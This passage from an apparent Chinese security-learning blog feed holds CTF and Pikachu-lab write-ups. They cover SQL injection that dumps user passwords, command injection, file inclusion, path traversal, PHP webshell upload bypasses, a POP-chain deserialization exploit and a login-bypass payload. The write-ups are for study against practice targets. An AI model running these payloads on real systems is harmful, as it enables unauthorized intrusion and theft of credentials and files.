<strong>1%df’ union select username,password from pikachu.users#</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301655472.png"></p><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="一、概述-3"><a href="#一、概述-3" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p><strong>远程系统命令执行</strong><br>        一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口<br>         比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。现在很多的甲方企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞,不信的话现在就可以找你们运维部的系统测试一下,会有意想不到的”收获”-_-                    </p><p>  <strong>远程代码执行</strong><br>                        同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。                   </p><p>​                        不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。                    </p><p>​                        因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。                    </p></blockquote><h3 id="二、exec-“ping”"><a href="#二、exec-“ping”" class="headerlink" title="二、exec “ping”"></a>二、exec “ping”</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301659965.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301700292.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301702635.png"></p><p>在后面加上 &amp;whoaimi  就可以执行whoami指令</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301701854.png"></p><h3 id="三、exec-“eval”"><a href="#三、exec-“eval”" class="headerlink" title="三、exec “eval”"></a>三、exec “eval”</h3><p>在上输入phpinfo();指令 得到回显，不局限于这个指令，你system(“ipconfig”)也能在上面回显出内容</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307301734866.png"></p><h2 id="File-Inclusion（文件包含）"><a href="#File-Inclusion（文件包含）" class="headerlink" title="File Inclusion（文件包含）"></a>File Inclusion（文件包含）</h2><h3 id="一、概述-4"><a href="#一、概述-4" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。比如 在PHP中，提供了：<br> include(),include_once()<br> require(),require_once()<br>            这些文件包含函数，这些函数在代码设计中被经常使用到。<br>            大多数情况下，文件包含函数中包含的代码文件是固定的，因此也不会出现安全问题。                        但是，有些时候，文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。攻击着会指定一个“意想不到”的文件让包含函数去执行，从而造成恶意操作。</p><p>​            根据不同的配置环境，文件包含漏洞分为如下两种情况：<br>​                        <strong>1.本地文件包含漏洞：</strong>仅能够对服务器本地的文件进行包含，由于服务器上的文件并不是攻击者所能够控制的，因此该情况下，攻击着更多的会包含一些固定的系统配置文件，从而读取系统敏感信息。很多时候本地文件包含漏洞会结合一些特殊的文件上传漏洞，从而形成更大的威力。<br>​                        <strong>2.远程文件包含漏洞：</strong>能够通过url地址对远程的文件进行包含，这意味着攻击者可以传入任意的代码，这种情况没啥好说的，准备挂彩。                    </p><p>​             因此，在web应用系统的功能设计上尽量不要让前端用户直接传变量给包含函数，如果非要这么做，也一定要做严格的白名单策略进行过滤。                                        </p></blockquote><h3 id="二、File-Inclusion-local"><a href="#二、File-Inclusion-local" class="headerlink" title="二、File Inclusion(local)"></a>二、File Inclusion(local)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061119220.png"></p><p>随便点一个提交发现得到回显，</p><p>从上面url我们可以发现文件名  <strong>file5.php</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061241190.png"></p><p>这些文件一般都是后台存在的文件，但此题是本地文件包含漏洞，我们可以通过修改上方的url来访问</p><p>可以通过在前面多个**..&#x2F;**来跳转到根目录</p><p>类似于  <strong>..&#x2F;..&#x2F;..&#x2F;Windows&#x2F;System32&#x2F;drivers&#x2F;etc&#x2F;hosts</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061256539.png"></p><p>按此路径也可以找到文件</p><p>或者在pikachu靶场里的<strong>include</strong>文件夹找到这几个回显出来的php文件</p><p>我们在里面建立一个txt文件可以成功访问</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061259377.png"></p><h3 id="三、File-Inclusion-remote"><a href="#三、File-Inclusion-remote" class="headerlink" title="三、File Inclusion(remote)"></a>三、File Inclusion(remote)</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061259481.png"></p><p>我们先去php.ini文件将<strong>allow_url_include</strong>改成<strong>On</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061524150.png"></p><p>打开后和第一题一样的回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061525195.png"></p><p>不过可以在url上看到include</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061526309.png"></p><p>然后我们可以就此修改去访问另一个网站的文件，比如</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061531014.png"></p><p>访问成功</p><h2 id="Unsafe-Filedownload（不安全的文件下载）"><a href="#Unsafe-Filedownload（不安全的文件下载）" class="headerlink" title="Unsafe Filedownload（不安全的文件下载）"></a>Unsafe Filedownload（不安全的文件下载）</h2><h3 id="一、概述-5"><a href="#一、概述-5" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。</p><p>如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。从而导致后台敏感信息(密码文件、源代码等)被下载。                     </p><p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。切记：所有与前端交互的数据都是不安全的，不能掉以轻心！                                    </p></blockquote><h3 id="二、Unsafe-Filedownload"><a href="#二、Unsafe-Filedownload" class="headerlink" title="二、Unsafe Filedownload"></a>二、Unsafe Filedownload</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061533745.png"></p><p>如Notice所说，如果点击图片下方名字即会下载图片，其他无线索，所以我们先点击一个图片，然后通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061539296.png">然后将<strong>filename</strong>后面的值修改为 <strong>..&#x2F;test.php</strong>（这个php文件是我自己创的并放在上级目录) </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061543372.png"></p><p>然后成功下载</p><h2 id="Unsafe-Fileupload（文件上传漏洞）"><a href="#Unsafe-Fileupload（文件上传漏洞）" class="headerlink" title="Unsafe Fileupload（文件上传漏洞）"></a>Unsafe Fileupload（文件上传漏洞）</h2><h3 id="一、概述-6"><a href="#一、概述-6" class="headerlink" title="一、概述"></a>一、概述</h3><blockquote><p>文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。                    </p><p> 所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>              –验证文件类型、后缀名、大小;<br>              –验证文件的上传方式;<br>              –对文件进行一定复杂的重命名;<br>              –不要暴露文件上传后的路径;<br>              –等等…</p></blockquote><h3 id="二、client-check-客户端check"><a href="#二、client-check-客户端check" class="headerlink" title="二、client check(客户端check)"></a>二、client check(客户端check)</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>先上传一个jpg图片里面写着phpinfo()函数，然后点击的一瞬间通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061605727.png"></p><p>将jpg后缀修改为php后缀并发送</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061605976.png"></p><p>然后访问该地址，得到回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061606856.png"></p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>用F12打开代码页面将<strong>onchange</strong>删除</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061608603.png"></p><p>然后直接上传php文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061609890.png"></p><p>访问得到与上题一样的回显</p><h3 id="三、MIME-type"><a href="#三、MIME-type" class="headerlink" title="三、MIME type"></a>三、MIME type</h3><p>本题即是利用将php文件通过BP抓包上传后，改变文件类型为图片类型以此来达到上传目的</p><p>我们先BP抓包一个php文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061612615.png"></p><p>即将此修改为 <strong>image&#x2F;jpeg</strong>    然后上传成功</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061617198.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061614928.png"></p><p>访问一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308061615338.png"></p><p>上传成功</p><h3 id="四、getimagesize"><a href="#四、getimagesize" class="headerlink" title="四、getimagesize()"></a>四、getimagesize()</h3><blockquote><p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p></blockquote><p><code>getimagesize()</code>函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部</p><p>所以我们可以通过文件幻术头来进行图片上传</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202309052028233.png"></p><p>利用文件包含漏洞解析此图片木马: <code>http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/09/05/29522464f71e89dc8e3484901611.jpg&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</code></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202309052035495.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB,十大常见漏洞,学习心得 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF里WEB题中的POP链</title>
      <link href="/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/"/>
      <url>/2023/06/04/CTF%E9%87%8CWEB%E9%A2%98%E4%B8%AD%E7%9A%84POP%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>再解释源代码之前，我们需要先了解一下这个php的魔术方法</p><p>在解释源代码之前，我们需要先了解一下这个php的魔术方法</p><blockquote><ol><li>__construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol></blockquote><p>然后再来看源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phpinclude(&quot;.&#x2F;xxxiscc.php&quot;);class boy &#123;public $like;public function __destruct() &#123; echo &quot;能请你喝杯奶茶吗？&lt;br&gt;&quot;; @$this-&gt;like-&gt;make_friends();&#125;public function __toString() &#123; echo &quot;拱火大法好&lt;br&gt;&quot;; return $this-&gt;like-&gt;string;&#125;&#125;class girl &#123;private $boyname;public function __call($func, $args) &#123; echo &quot;我害羞羞&lt;br&gt;&quot;; isset($this-&gt;boyname-&gt;name); &#125;&#125;class helper &#123;private $name;private $string;public function __construct($string) &#123; $this-&gt;string &#x3D; $string;&#125;public function __isset($val) &#123; echo &quot;僚机上线&lt;br&gt;&quot;; echo $this-&gt;name;&#125;public function __get($name) &#123; echo &quot;僚机不懈努力&lt;br&gt;&quot;; $var &#x3D; $this-&gt;$name; $var[$name]();&#125;&#125;class love_story &#123;public function love() &#123; echo &quot;爱情萌芽&lt;br&gt;&quot;; array_walk($this, function($make, $colo)&#123;   echo &quot;坠入爱河，给你爱的密码&lt;br&gt;&quot;;   if ($make[0] &#x3D;&#x3D;&#x3D; &quot;girl_and_boy&quot; &amp;&amp; $colo &#x3D;&#x3D;&#x3D; &quot;fall_in_love&quot;) &#123;     global $flag;     echo $flag;   &#125; &#125;);&#125;&#125;if (isset($_GET[&quot;iscc&quot;])) &#123;$a&#x3D;unserialize($_GET[&#39;iscc&#39;]);&#125; else &#123;highlight_file(__FILE__);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当这个php代码开始走的时候，先是__destruct()魔术方法被触发，然后echo出句子，当进行到</p><p><strong>$this-&gt;like-&gt;make_friends();</strong>  发现它调用了一个make_friends方法，但是这个方法不存在，所以触发call()魔术方法，在__call()中,echo出句子后，进行**isset($this-&gt;boyname-&gt;name);**会发现其触发了____isset()魔术方法</p><p>因为我们可以从代码里看到这俩个属性都是私有的，不可访问。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922222.png"></p><p>那么我们继续走，当进行isset()魔术方法时，echo出它的句子，然后发现其**echo $this-&gt;name;**发现name前没加$，意思为name被当成字符串，所以会发现其触发__toString()魔术方法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922283.png"></p><p>echo出句子，然后进行<strong>return $this-&gt;like-&gt;string;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922390.png" alt="image-20230514203808378"></p><p>string是类helper里的成员变量。所以触发了__get()魔术方法。echo出句子后</p><p>   $var &#x3D; $this-&gt;$name;<br>    $var 【$name](); 从当前对象实例中获取一个变量，使用$name变量中指定的变量名称。然后，它尝试调用检索到的变量上的方法，使用相同的$name值作为方法名。（还是有点不太清楚）然后就是往下走类。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300922316.png"></p><p>满足$colo强等于”fall_in_love”,且数组[0]&#x3D;”girl_and_boy”;</p><p>所以就可以构建出一个链表并以此来写出PHP代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">class boy&#123; public $like;&#125;class girl&#123; public $boyname;&#125;class helper&#123; public $name; public $string; public function __construct()&#123;     $this-&gt;string&#x3D;array(&quot;string&quot;&#x3D;&gt;array(new love_story(),&quot;love&quot;)); &#125;&#x2F;&#x2F;这是一个公共函数构造器（__construct），它需要一个字符串作为参数。在函数内部，将传入的字符串赋值给类的属性 $this-&gt;string。其中包含一个名为 &quot;string&quot; 的属性，它是一个数组，该数组包含了一个新的 love_story 对象和一个字符串 &quot;love&quot;&#125;class love_story&#123; public $fall_in_love&#x3D;array(0&#x3D;&gt;&#39;girl_and_boy&#39;);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上半部分就是将类进行书写。以及满足love_story类中的条件。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$b1 &#x3D; new boy();$b &#x3D; new boy();$g &#x3D; new girl();$h1 &#x3D; new helper();$h &#x3D; new helper();$l &#x3D; new love_story();$h-&gt;string&#x3D;array(&quot;string&quot;&#x3D;&gt;array(new love_story(),&quot;love&quot;));$b-&gt;like&#x3D;$h;$h1-&gt;name&#x3D;$b;$g-&gt;boyname&#x3D;$h1;$b1-&gt;like&#x3D;$g;echo serialize($b1);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下半函数就是我们的链表，也就是上面我所说的按照那个顺序一步一步走，最后到达</p><p><strong>$h-&gt;string&#x3D;array(“string”&#x3D;&gt;array(new love_story(),”love”));</strong> 然后get传参iscc&#x3D;序列化后的结果，得到线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202307300923309.png"></p><p>从这些被echo的句子也能看出链表。</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB POP链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php中json_decode函数</title>
      <link href="/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/"/>
      <url>/2023/05/31/php%E4%B8%ADjson-decode%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON函数"><a href="#JSON函数" class="headerlink" title="JSON函数"></a>JSON函数</h2><h3 id="json-decode函数"><a href="#json-decode函数" class="headerlink" title="json_decode函数"></a>json_decode函数</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311939562.png"></p><p>JSON 字符串 ：</p><p>JSON 中的字符串必须用双引号包围。</p><p>例如       {“ctf”:”play”}    俩字符串用:隔开</p><p>JSON 数字 ：</p><p>JSON 中的数字必须是整数或浮点数。</p><p>例如        {“ctf”:100}</p><p>在 JSON 中，值必须是以下数据类型之一：字符串，数字，对象(json对象)，数组，布尔，null</p><p>不可以为以下数据类型之一： 函数，日期，undefined</p><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p>在PHP中   json_decode() 函数用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><p>代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$json &#x3D; &#39;&#123;&quot;ctfer&quot;:&quot;sanmao&quot;,&quot;ctf&quot;:&quot;misc&quot;,&quot;age&quot;:18,&quot;bisai&quot;:14,&quot;champion&quot;:5&#125;&#39;;var_dump(json_decode($json));&#96;var_dump(json_decode($json, true));&#96;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>实例演示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311948136.png"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h3 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[[SWPUCTF 2021 新生赛] jicao]"></a>[[SWPUCTF 2021 新生赛] jicao]</h3><p>源代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(&#39;index.php&#39;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&#39;id&#39;];$json&#x3D;json_decode($_GET[&#39;json&#39;],true);if ($id&#x3D;&#x3D;&quot;wllmNB&quot;&amp;&amp;$json[&#39;x&#39;]&#x3D;&#x3D;&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题需要进行一个post传参，一个get传参，post传参很简单，在Max HackBar或者在BP里传入 id&#x3D;wllmNB</p><p>但是get传参则需要通过调用 PHP 内置函数 json_decode()，将字符串解析为一个关联数组，第二个参数 true 表示将解析结果以数组形式返回。最终将解析得到的数组赋值给变量 $json，可以在后续的代码中使用。</p><p>即构造 url+&#x2F;?json&#x3D;{“x”:”wllm”}   即上面所学json对字符串的值</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202305311954553.png"></p><p>即可得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> php基础，代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUWeb刷题记录</title>
      <link href="/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/23/BUUWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><h3 id="一、本题做题思路"><a href="#一、本题做题思路" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>本题打开后是一个登录网站，结合题目所给提示，考虑应该是SQL注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231457412.png"></p><p> 看一下源代码，发现是get传参，和要加上check.php</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231459936.png"></p><p> 判断下闭合方式,发现是‘闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231502368.png"></p><p> 结合其为登录页面，尝试一下万能密码得到flag。</p><blockquote><p>payload：url+&#x2F;check.php?username&#x3D;1&amp;password&#x3D;admin’or’1&#x3D;1</p></blockquote><p> 也可以选择直接在页面的用户名和密码上输入admin’or’1&#x3D;1。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202304231510964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点"><a href="#二、本题知识点" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> <strong>万能密码</strong>   可以看这位大佬的博客：<a href="https://blog.csdn.net/hxhxhxhxx/article/details/108020010">大佬博客</a></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><h3 id="一、本题做题思路-1"><a href="#一、本题做题思路-1" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>页面就是一个简单撸猫画面，所以查看源代码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722891.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041722721.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>在查看源代码时拉到最下面，发现一串代码审计内容，所以通过修改payload得到flag</p><blockquote><p>payload: url+&#x2F;?cat&#x3D;dog </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723676.png"></p><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="一、本题做题思路-2"><a href="#一、本题做题思路-2" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开以后就是一个滑稽笑脸，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041723660.png"></p><p>通过查看源代码找到线索，去线索里看一看</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724631.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还有一个线索可以去<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 进入这个php得到线索，返回source.php进行代码审计</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php    highlight_file(__FILE__);    class emmm    &#123;        public static function checkFile(&amp;$page)        &#123;            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];&#x2F;&#x2F;定义了白名单            if (! isset($page) || !is_string($page)) &#123;                echo &quot;you can&#39;t see it&quot;;                return false;            &#125;            &#x2F;&#x2F;判断 当page存在或者page是字符串时，返回true            if (in_array($page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;白名单过滤,需要传入的page中由source.php或者hint.php            $_page &#x3D; mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            &#x2F;&#x2F;mb_substr() 函数返回字符串的一部分,返回到0到mb_strpos的内容。            &#x2F;&#x2F;mb_strpos() 查找字符串在另一个字符串中首次出现的位置            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;查看page是否存在在白名单里面            $_page &#x3D; urldecode($page);            &#x2F;&#x2F;对page进行一次decode解码             $_page &#x3D; mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            &#x2F;&#x2F;与上面一样，查看俩个?之间的内容            if (in_array($_page, $whitelist)) &#123;                return true;            &#125;            &#x2F;&#x2F;查看是否存在白名单            echo &quot;you can&#39;t see it&quot;;            return false;        &#125;    &#125;    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;        include $_REQUEST[&#39;file&#39;];        exit;    &#125; else &#123;        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;    &#125;  ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 所以构造payload，得到flag</p><blockquote><p>payload: url+&#x2F;?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725779.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><h3 id="一、本题做题思路-3"><a href="#一、本题做题思路-3" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开后就是一个tips</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725568.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点开后查看源代码也没得到什么线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725580.png"><img 